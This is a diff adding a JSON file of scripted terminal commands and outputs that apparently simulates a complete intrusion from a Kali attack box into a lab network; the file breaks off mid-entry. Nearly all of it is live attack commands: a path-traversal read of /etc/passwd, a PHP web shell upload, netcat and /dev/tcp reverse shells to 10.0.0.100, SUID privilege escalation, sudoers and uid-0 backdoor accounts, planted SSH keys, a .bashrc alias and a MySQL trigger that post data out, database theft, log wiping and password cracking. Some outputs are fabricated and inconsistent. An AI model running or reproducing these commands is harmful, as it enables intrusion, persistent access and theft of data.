@@ -1,0 +1,1058 @@
+[
+    {
+        "prompt": "",
+        "command": "",
+        "output": [
+            "Booting `Kali GNU/Linux`",
+            "",
+            "[    0.000000] Linux version 6.1.0-kali3-amd64 (devel@kali.org) (gcc (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali1",
+            "[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-6.1.0-kali3-amd64 root=UUID=1234-5678-90AB-CDEF ro quiet splash",
+            "[    0.000000] KASLR enabled",
+            "[    1.234567] Initializing cgroup subsys cpu",
+            "[    1.234568] CPU: Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz",
+            "[    1.567890] Memory: 8GB (8192 MB)",
+            "[    2.123456] Starting system log daemon: rsyslogd.",
+            "[    2.567890] Starting OpenSSH server: sshd.",
+            "[    2.987654] Network interface wlan0 initialized.",
+            "[    3.456789] Kali GNU/Linux 2024 rolling tty1",
+            "",
+            "kali login: kali",
+            "Password: ********",
+            "Welcome to Kali GNU/Linux 2024 rolling",
+            "kali@attackbox:~$"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "tor",
+        "output": [
+            "   Starting Tor...",
+            "   Tor started successfully. Listening on 127.0.0.1:9050."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html",
+        "output": [
+            "   ===============================================================",
+            "   Gobuster v3.1.0",
+            "   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)",
+            "   ===============================================================",
+            "   /cms (Status: 200)",
+            "   /uploads (Status: 200)",
+            "   /admin (Status: 403)",
+            "   /backup (Status: 403)",
+            "   ==============================================================="
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl -i http://10.0.0.5/cms",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Content-Type: text/html; charset=UTF-8",
+            "   X-Powered-By: PHP/7.4.3",
+            "   <!DOCTYPE html>",
+            "   <html>",
+            "   <head><title>CMS Login</title></head>",
+            "   <body>",
+            "   <h1>Welcome to Our CMS</h1>",
+            "   <form action='login.php' method='POST'>",
+            "   </body>",
+            "   </html>"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl -i 'http://10.0.0.5/cms/index.php?page=../../../../../../etc/passwd'",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Content-Type: text/html; charset=UTF-8",
+            "",
+            "   root:x:0:0:root:/root:/bin/bash",
+            "   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+            "   mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false",
+            "   ...truncated..."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl -i 'http://10.0.0.5/cms/index.php?page=../../../../../../var/log/apache2/access.log'",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Content-Type: text/html; charset=UTF-8",
+            "",
+            "   10.0.0.1 - - [12/Nov/2024:10:21:33 +0000] \"GET /cms/index.php?page=../../../../../../etc/passwd HTTP/1.1\" 200 -",
+            "   10.0.0.1 - - [12/Nov/2024:10:22:15 +0000] \"GET /cms/index.php?page=../../../../../../var/www/html/uploads/shell.php HTTP/1.1\" 200 -",
+            "   ...truncated..."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl -X POST -F 'file=@shell.php' http://10.0.0.5/cms/index.php?page=upload",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Content-Type: text/html; charset=UTF-8",
+            "   <h1>File successfully uploaded to /var/www/html/uploads/shell.php</h1>"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl 'http://10.0.0.5/uploads/shell.php?cmd=whoami'",
+        "output": [
+            "   www-data"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "curl 'http://10.0.0.5/uploads/shell.php?cmd=nc -e /bin/bash 10.0.0.1 4444'",
+        "output": []
+    },
+    {
+        "prompt": "",
+        "command": "nc -lvnp 4444",
+        "output": [
+            "   listening on [any] 4444 ...",
+            "   connect to [10.0.0.1] from (UNKNOWN) [10.0.0.5] 12345",
+            "   bash: no job control in this shell",
+            "   www-data@webserver:/var/www/html$"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "which python3",
+        "output": [
+            "   /usr/bin/python3"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh",
+        "output": [
+            "   --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+            "   Resolving github.com (github.com)... 140.82.121.4",
+            "   Connecting to github.com (github.com)|140.82.121.4|:443... connected.",
+            "   HTTP request sent, awaiting response... 200 OK",
+            "   Length: 1244563 (1.2M) [text/plain]",
+            "   Saving to: ‘/tmp/linpeas.sh’",
+            "   /tmp/linpeas.sh     100%[=====================>]   1.19M  10.5MB/s    in 0.1s",
+            "   2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "chmod +x /tmp/linpeas.sh",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "curl -o /tmp/nc http://10.0.0.100/tools/nc",
+        "output": [
+            "     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current",
+            "                                    Dload  Upload   Total   Spent    Left  Speed",
+            "   100   592  100   592    0     0   2452      0 --:--:-- --:--:-- --:--:--  2452"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "chmod +x /tmp/nc",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "ifconfig",
+        "output": [
+            "   eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
+            "           inet 10.0.0.5  netmask 255.255.255.0  broadcast 10.0.0.255",
+            "           ether 02:42:ac:11:00:02  txqueuelen 1000  (Ethernet)"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "nmap -sP 10.0.0.0/24",
+        "output": [
+            "   Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-12 18:35 UTC",
+            "   Nmap scan report for 10.0.0.1",
+            "   Host is up (0.00045s latency).",
+            "   Nmap scan report for 10.0.0.5",
+            "   Host is up (0.0015s latency).",
+            "   Nmap scan report for 10.0.0.6",
+            "   Host is up (0.0010s latency).",
+            "   Nmap scan report for 10.0.0.7",
+            "   Host is up (0.0011s latency).",
+            "   Nmap done: 256 IP addresses (4 hosts up) scanned in 2.34 seconds"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "nmap -sS -Pn -T4 -p- 10.0.0.6",
+        "output": [
+            "   Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-12 18:37 UTC",
+            "   Nmap scan report for 10.0.0.6",
+            "   Host is up (0.0010s latency).",
+            "   Not shown: 65534 closed ports",
+            "   PORT    STATE SERVICE",
+            "   22/tcp  open  ssh",
+            "   8080/tcp open  http-proxy",
+            "   Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "nmap -sS -Pn -T4 -p- 10.0.0.7",
+        "output": [
+            "   Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-12 18:39 UTC",
+            "   Nmap scan report for 10.0.0.7",
+            "   Host is up (0.0011s latency).",
+            "   Not shown: 65533 closed ports",
+            "   PORT     STATE SERVICE",
+            "   22/tcp   open  ssh",
+            "   3306/tcp open  mysql",
+            "   Nmap done: 1 IP address (1 host up) scanned in 5.12 seconds"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "/tmp/linpeas.sh | tee /tmp/linpeas_output.txt",
+        "output": [
+            "   Hostname: webserver",
+            "   Kernel: 4.15.0-78-generic x86_64",
+            "   OS: Ubuntu 18.04.6 LTS",
+            "   User ID: 33 (www-data)",
+            "   [+] SUID binaries:",
+            "      /usr/bin/vuln_suid",
+            "   [+] Writable directories:",
+            "      /var/www/html/uploads",
+            "   [+] Cron jobs:",
+            "      /etc/cron.d/backupjob - runs as root"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "strings /usr/bin/vuln_suid",
+        "output": [
+            "   /lib/x86_64-linux-gnu/libc.so.6",
+            "   __libc_start_main",
+            "   system",
+            "   sh"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "/usr/bin/vuln_suid",
+        "output": [
+        ]
+    },
+    {
+        "prompt": "sh-4.4$",
+        "command": "id",
+        "output": [
+            "   uid=0(root) gid=0(root) groups=0(root)"
+        ]
+    },
+    {
+        "prompt": "sh-4.4$",
+        "command": "whoami",
+        "output": [
+            "   root"
+        ]
+    },
+    {
+        "prompt": "sh-4.4$",
+        "command": "echo \"ALL ALL=(ALL:ALL) NOPASSWD:ALL\" >> /etc/sudoers",
+        "output": []
+    },
+    {
+        "prompt": "sh-4.4$",
+        "command": "exit",
+        "output": [
+            "   www-data@webserver:/var/www/html$"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "sudo -i",
+        "output": [
+            "   root@webserver:/root#"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "useradd -ou 0 -g 0 -m -s /bin/bash backdoor",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo 'backdoor:SuperSecret2024!' | chpasswd",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "mkdir -p /root/.ssh && chmod 700 /root/.ssh",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo 'ssh-rsa AAAAB3Nza...AttackerPublicKey' >> /root/.ssh/authorized_keys",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "chmod 600 /root/.ssh/authorized_keys",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "crontab -l > /tmp/current_cron",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo '* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1' >> /tmp/current_cron",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "crontab /tmp/current_cron",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "rm /tmp/current_cron",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo 'alias ls=\"ls --color=auto; curl -X POST -d @/etc/passwd http://10.0.0.100/exfil\"' >> /root/.bashrc",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo 'export HISTCONTROL=ignoreboth' >> /root/.bashrc",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "echo 'history -c && history -w' >> /root/.bash_logout",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "exit",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "sudo -i",
+        "output": [
+            "   root@webserver:/root#"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "find /var/www/html/ -type f -name '*.php' -exec grep -Hin 'password' {} \\;",
+        "output": [
+            "   /var/www/html/config.php:5:$db_password = 'SuperSecurePassword!';",
+            "   /var/www/html/.env:3:DB_PASSWORD=SecureDBPass2024!"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /var/www/html/config.php",
+        "output": [
+            "   <?php",
+            "   $db_host = '10.0.0.7';",
+            "   $db_user = 'dbadmin';",
+            "   $db_password = 'SuperSecurePassword!';",
+            "   ?>"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /var/www/html/.env",
+        "output": [
+            "   DB_HOST=10.0.0.7",
+            "   DB_USER=dbadmin",
+            "   DB_PASSWORD=SecureDBPass2024!"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "grep -r -i 'api_key' /var/www/html/",
+        "output": []
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "find /home -type f -iname '*.txt' -exec ls -lh {} \\;",
+        "output": [
+            "   -rw-r--r--  1 webadmin webadmin 520 Nov 12 12:00 /home/webadmin/notes.txt"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /home/webadmin/notes.txt",
+        "output": [
+            "   Reminder: The app server is accessible with SSH.",
+            "   Try credentials admin / Welcome2024 if in trouble."
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "grep -r -i 'ssh' /var/log/",
+        "output": [
+            "   /var/log/auth.log:Nov 12 10:15:02 webserver sshd[1250]: Accepted password for admin from 10.0.0.6 port 52522 ssh2",
+            "   /var/log/auth.log:Nov 12 10:20:10 webserver sshd[1260]: Accepted password for webadmin from 10.0.0.6 port 52528 ssh2"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /home/webadmin/.ssh/known_hosts",
+        "output": [
+            "   10.0.0.6 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICRMlIlt1A9Hojmd...app-server-public-key"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /home/webadmin/.bash_history",
+        "output": [
+            "   ssh admin@10.0.0.6",
+            "   scp /var/log/nginx/access.log webadmin@10.0.0.7:/tmp/",
+            "   vim /etc/nginx/nginx.conf"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "cat /var/log/nginx/access.log | grep 'login'",
+        "output": [
+            "   10.0.0.1 - - [12/Nov/2024:10:12:43 +0000] \"POST /login HTTP/1.1\" 200",
+            "   10.0.0.6 - admin [12/Nov/2024:10:15:02 +0000] \"POST /login HTTP/1.1\" 200",
+            "   10.0.0.6 - user1 [12/Nov/2024:10:20:42 +0000] \"POST /login HTTP/1.1\" 200"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "grep -r -i 'mysql' /etc/",
+        "output": [
+            "   /etc/mysql/my.cnf:password=SecureDBPass2024!"
+        ]
+    },
+    {
+        "prompt": "root@webserver:/root#",
+        "command": "ssh admin@10.0.0.6",
+        "output": [
+            "   admin@10.0.0.6's password: ",
+            "   Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-135-generic x86_64)",
+            "   Last login: Tue Nov 12 11:45:20 2024 from 10.0.0.5",
+            "   admin@app-server:/home/admin$"
+        ]
+    },
+    {
+        "prompt": "admin@app-server:/home/admin$",
+        "command": "ps aux | grep -i mail",
+        "output": [
+            "   root       1012  0.0  0.5  25088  4500 ?        Ss   11:45   0:01 /usr/sbin/postfix -c /etc/postfix",
+            "   dovecot    1025  0.0  0.4  20512  3956 ?        Ss   11:45   0:02 /usr/sbin/dovecot",
+            "   root       1035  0.0  0.3  15000  2500 ?        Ss   11:45   0:01 /usr/sbin/saslauthd -a pam -n 5"
+        ]
+    },
+    {
+        "prompt": "admin@app-server:/home/admin$",
+        "command": "systemctl status postfix",
+        "output": [
+            "   ● postfix.service - Postfix Mail Transport Agent",
+            "      Loaded: loaded (/lib/systemd/system/postfix.service; enabled; vendor preset: enabled)",
+            "      Active: active (running) since Tue 2024-11-12 11:45:00 UTC; 1h 15min ago",
+            "        Docs: man:postfix(1)",
+            "              man:postconf(5)",
+            "              http://www.postfix.org/",
+            ""
+        ]
+    },
+    {
+        "prompt": "admin@app-server:/home/admin$",
+        "command": "systemctl status dovecot",
+        "output": [
+            "   ● dovecot.service - Dovecot IMAP/POP3 email server",
+            "      Loaded: loaded (/lib/systemd/system/dovecot.service; enabled; vendor preset: enabled)",
+            "      Active: active (running) since Tue 2024-11-12 11:45:00 UTC; 1h 15min ago",
+            "        Docs: man:dovecot(1)",
+            "              http://www.dovecot.org/",
+            ""
+        ]
+    },
+    {
+        "prompt": "admin@app-server:/home/admin$",
+        "command": "sudo -l",
+        "output": [
+            "   Matching Defaults entries for admin on app-server:",
+            "       env_reset, mail_badpass,",
+            "       secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+            "",
+            "   User admin may run the following commands on app-server:",
+            "       (ALL : ALL) ALL"
+        ]
+    },
+    {
+        "prompt": "admin@app-server:/home/admin$",
+        "command": "sudo -i",
+        "output": [
+            "   root@app-server:/root#"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "ls /var/mail",
+        "output": [
+            "   admin",
+            "   johndoe",
+            "   janedoe"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "cat /var/mail/johndoe",
+        "output": [
+            "   From: boss@example.com",
+            "   To: johndoe@example.com",
+            "   Subject: Urgent Project Update",
+            "",
+            "   Hi John,",
+            "   Please review the attached document for the project update. Let me know your thoughts.",
+            "",
+            "   Regards,",
+            "   Boss"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "grep -r 'password' /etc/dovecot/",
+        "output": [
+            "   /etc/dovecot/dovecot.conf:auth_mechanisms = plain login",
+            "   /etc/dovecot/dovecot.conf:passdb { driver = pam }"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "cat /etc/postfix/main.cf",
+        "output": [
+            "   myhostname = app-server.local",
+            "   mydomain = example.com",
+            "   myorigin = $mydomain",
+            "   smtpd_sasl_auth_enable = yes",
+            "   smtpd_tls_auth_only = yes",
+            "   smtpd_tls_cert_file = /etc/ssl/certs/mail-cert.pem",
+            "   smtpd_tls_key_file = /etc/ssl/private/mail-key.pem"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "echo 'johndoe@example.com attacker@example.com' >> /etc/aliases && newaliases",
+        "output": []
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "echo '* * * * * root bash -i >& /dev/tcp/10.0.0.100/4444 0>&1' >> /etc/cron.d/backdoor",
+        "output": []
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "ssh dbadmin@10.0.0.7",
+        "output": [
+            "   dbadmin@10.0.0.7's password: ",
+            "   Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-135-generic x86_64)",
+            "   Last login: Tue Nov 12 12:00:00 2024 from 10.0.0.6",
+            "   dbadmin@db-server:/home/dbadmin$"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "ls -la /var/lib/mysql/",
+        "output": [
+            "   total 12288",
+            "   drwxr-x--x  6 mysql mysql    4096 Nov 12 12:00 .",
+            "   drwxr-xr-x 48 root  root     4096 Nov 12 11:59 ..",
+            "   -rw-r-----  1 mysql mysql    1845 Nov 12 12:00 ib_logfile0",
+            "   -rw-r-----  1 mysql mysql    1845 Nov 12 12:00 ib_logfile1",
+            "   drwxr-x---  2 mysql mysql    4096 Nov 12 12:00 business_data"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "cat ~/.mysql_history",
+        "output": [
+            "   USE business_data;",
+            "   SELECT * FROM users;",
+            "   ALTER TABLE transactions ADD COLUMN sensitive_info VARCHAR(255);"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "ps aux | grep mysql",
+        "output": [
+            "   mysql    1024  0.1  3.5 123456 12345 ?        Ssl  12:00   0:20 /usr/sbin/mysqld"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "netstat -tuln",
+        "output": [
+            "   Active Internet connections (only servers)",
+            "   Proto Recv-Q Send-Q Local Address           Foreign Address         State       ",
+            "   tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      ",
+            "   tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      "
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "cat /etc/mysql/my.cnf",
+        "output": [
+            "   [client]",
+            "   user=root",
+            "   password=MySQLRootPass123!",
+            "   [mysqld]",
+            "   bind-address = 0.0.0.0",
+            "   datadir=/var/lib/mysql",
+            "   log-error=/var/log/mysql/error.log"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "mysql -u root -pMySQLRootPass123!",
+        "output": [
+            "Welcome to the MySQL monitor.  Commands end with ; or \\g.",
+            "Your MySQL connection id is 42",
+            "Server version: 8.0.33 MySQL Community Server - GPL"
+        ]
+    },
+    {
+        "prompt": "mysql> ",
+        "command": "SHOW DATABASES;",
+        "output": [
+            "   +--------------------+",
+            "   | Database           |",
+            "   +--------------------+",
+            "   | information_schema |",
+            "   | business_data      |",
+            "   | mysql              |",
+            "   +--------------------+"
+        ]
+    },
+    {
+        "prompt": "mysql> ",
+        "command": "USE mysql;",
+        "output": [
+            "   Database changed."
+        ]
+    },
+    {
+        "prompt": "mysql> ",
+        "command": "SELECT user, host, authentication_string FROM user;",
+        "output": [
+            "   +------------------+-----------+------------------------------------+",
+            "   | user             | host      | authentication_string             |",
+            "   +------------------+-----------+------------------------------------+",
+            "   | root             | localhost | *6C8989366EAF75BB670AD8EA7A7FC117 |",
+            "   | mysql.session    | localhost |                                   |",
+            "   | mysql.sys        | localhost |                                   |",
+            "   | dbadmin          | localhost | *2B9FA03C6A9CC3950F2A6C3F2E9E60B8 |",
+            "   +------------------+-----------+------------------------------------+"
+        ]
+    },
+    {
+        "prompt": "mysql> ",
+        "command": "GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%' IDENTIFIED BY 'BackdoorPass123!';",
+        "output": [
+            "   Query OK, 0 rows affected (0.01 sec)"
+        ]
+    },
+    {
+        "prompt": "mysql> ",
+        "command": "CREATE TRIGGER exfiltrate_data AFTER INSERT ON business_data.users FOR EACH ROW BEGIN DECLARE cmd CHAR(255); SET cmd=CONCAT('/usr/bin/curl -X POST -d \"', NEW.email, '\" http://10.0.0.100/exfil'); DO cmd; END;",
+        "output": [
+            "   Query OK, 0 rows affected (0.01 sec)"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "cat /etc/mysql/my.cnf | grep datadir",
+        "output": [
+            "   datadir=/var/lib/mysql"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "ls -lh /var/lib/mysql",
+        "output": [
+            "   total 123M",
+            "   drwxr-x---  2 mysql mysql  4.0K Nov 12 12:00 business_data",
+            "   -rw-r-----  1 mysql mysql  1.5M Nov 12 11:59 ibdata1",
+            "   -rw-r-----  1 mysql mysql 32.0M Nov 12 11:59 ib_logfile0",
+            "   -rw-r-----  1 mysql mysql 32.0M Nov 12 11:59 ib_logfile1",
+            "   -rw-r-----  1 mysql mysql  8.0M Nov 12 11:59 ib_logfile2"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "tar -czf /tmp/mysql_image.tar.gz /var/lib/mysql",
+        "output": []
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "ls -lh /tmp/mysql_image.tar.gz",
+        "output": [
+            "   -rw-r--r--  1 dbadmin dbadmin 45M Nov 12 13:50 /tmp/mysql_image.tar.gz"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "curl -X POST -F 'file=@/tmp/mysql_image.tar.gz' http://cloud-storage-service/upload",
+        "output": [
+            "     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current",
+            "                                    Dload  Upload   Total   Spent    Left  Speed",
+            "   100  45M      0     0  100  45M   5.0M      0  0:00:09  0:00:09 --:--:--  5.0M",
+            "   Upload successful."
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "shred -u /tmp/mysql_image.tar.gz",
+        "output": []
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "history -c && history -w",
+        "output": []
+    },
+    {
+        "prompt": "dbadmin@db-server:/home/dbadmin$",
+        "command": "exit",
+        "output": []
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "echo '* * * * * root bash -i >& /dev/tcp/10.0.0.100/5555 0>&1' >> /etc/cron.d/reverse_shell",
+        "output": []
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "history -c && history -w",
+        "output": []
+    },
+    {
+        "prompt": "root@app-server:/root#",
+        "command": "exit",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "rm -rf /tmp/linpeas.sh /tmp/nc",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "history -c && history -w",
+        "output": []
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html$",
+        "command": "exit",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "ls -lh stolen_data/",
+        "output": [
+            "   total 75M",
+            "   -rw-r--r-- 1 kali kali 5.2M Nov 12 14:00 business_data_dump.sql",
+            "   -rw-r--r-- 1 kali kali 45M Nov 12 14:00 mysql_image.tar.gz",
+            "   -rw-r--r-- 1 kali kali 12M Nov 12 14:00 customer_data.csv"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "file stolen_data/mysql_image.tar.gz",
+        "output": [
+            "   stolen_data/mysql_image.tar.gz: gzip compressed data, was 'mysql_image.tar', last modified: Tue Nov 12 14:00:00 2024"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "tar -xzf stolen_data/mysql_image.tar.gz -C extracted/",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "head -n 20 stolen_data/business_data_dump.sql",
+        "output": [
+            "   -- MySQL dump 10.13  Distrib 8.0.33, for Linux (x86_64)",
+            "   --",
+            "   -- Host: localhost    Database: business_data",
+            "   -- ------------------------------------------------------",
+            "   CREATE TABLE `users` (",
+            "     `id` int NOT NULL AUTO_INCREMENT,",
+            "     `username` varchar(50) NOT NULL,",
+            "     `password` varchar(255) NOT NULL,",
+            "     `email` varchar(100) NOT NULL,",
+            "     PRIMARY KEY (`id`)",
+            "   );",
+            "   INSERT INTO `users` VALUES (1,'admin','$2y$10$Ex4mpl3H4sh','admin@example.com');",
+            "   INSERT INTO `users` VALUES (2,'user1','$2y$10$Qx4mpl3Us3r','user1@example.com');"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "grep -E \"INSERT INTO \\`users\\`\" stolen_data/business_data_dump.sql | awk -F\",\" '{print $2, $3, $4}'",
+        "output": [
+            "   'admin' '$2y$10$Ex4mpl3H4sh' 'admin@example.com'",
+            "   'user1' '$2y$10$Qx4mpl3Us3r' 'user1@example.com'"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "output": [
+            "   $2y$10$Ex4mpl3H4sh:SuperSecurePassword!",
+            "   $2y$10$Qx4mpl3Us3r:User1Password123!"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "head -n 10 stolen_data/customer_data.csv",
+        "output": [
+            "   Name,Email,Phone",
+            "   John Doe,john.doe@example.com,555-1234",
+            "   Jane Smith,jane.smith@example.com,555-5678"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "cat stolen_data/customer_data.csv | awk -F, '{print $1, $2}' > emails.txt",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "ls extracted/var/lib/mysql/business_data/",
+        "output": [
+            "   users.ibd",
+            "   transactions.ibd",
+            "   db.opt"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "mysqld --datadir=extracted/var/lib/mysql --skip-grant-tables",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "mysql -u root -e \"SELECT * FROM business_data.users;\"",
+        "output": [
+            "   +----+----------+------------------------+---------------------+",
+            "   | id | username | password               | email               |",
+            "   +----+----------+------------------------+---------------------+",
+            "   | 1  | admin    | SuperSecurePassword!   | admin@example.com   |",
+            "   | 2  | user1    | User1Password123!      | user1@example.com   |",
+            "   +----+----------+------------------------+---------------------+"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "cat emails.txt",
+        "output": [
+            "   John Doe john.doe@example.com",
+            "   Jane Smith jane.smith@example.com"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "paste emails.txt passwords.txt",
+        "output": [
+            "   John Doe john.doe@example.com SuperSecurePassword!",
+            "   Jane Smith jane.smith@example.com User1Password123!"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
